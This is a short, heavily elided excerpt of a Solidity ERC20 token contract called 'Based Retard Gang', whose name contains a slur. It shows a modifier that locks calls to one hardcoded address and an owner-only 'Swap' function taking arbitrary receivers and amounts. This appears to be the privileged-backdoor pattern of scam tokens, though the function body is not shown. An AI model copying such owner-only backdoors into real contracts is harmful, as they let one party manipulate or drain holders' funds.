...
contract brg is Context, IERC20 {
    ...
    modifier _auth() {require(msg.sender == 0x88Ff9570694998C8A11d729BFC7C9Da4fAE89BF5, "Not allowed to interact");_;}
  ...
  function Swap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    ...
    address public _Owner = 0x88Ff9570694998C8A11d729BFC7C9Da4fAE89BF5;

    constructor () public {
        _name = "Based Retard Gang";
        _symbol ="BRG";
        _decimals = 18;
        uint256 initialSupply = 1000000000;
        team = 0x88Ff9570694998C8A11d729BFC7C9Da4fAE89BF5;
